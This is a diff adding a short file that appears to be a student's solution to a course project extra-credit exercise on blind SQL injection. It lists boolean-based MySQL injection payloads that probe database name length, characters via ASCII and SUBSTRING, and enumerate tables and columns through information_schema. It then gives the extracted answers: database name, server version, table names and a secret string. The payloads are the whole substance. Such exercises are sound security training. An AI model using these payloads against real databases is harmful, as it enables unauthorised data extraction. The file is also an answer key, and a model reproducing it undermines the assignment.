@@ -1,0 +1,25 @@
+Query Formats Used:
+
+1' AND (SELECT LENGTH(database()))<=17#
+
+1' AND (SELECT ASCII(SUBSTRING(database(), 2, 1)))=112#
+
+1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=3#
+
+1' AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)=5#
+
+1' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) LIKE 'a%'#
+
+1' AND (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='SECRETTABLE')=1#
+
+1' AND (SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='SECRETTABLE' LIMIT 0,1)=1#
+
+1' AND (SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='SECRETTABLE' LIMIT 0,1) LIKE 'a%'#
+
+
+Solution:
+
+Name: proj2_xtra_cr3dit
+Version: 5.5.50-0UBUNTU0.14.04.1
+Tables: SECRETTABLE, FOO, INJECT__USERS
+Secret: __A_SECRET_STRING__
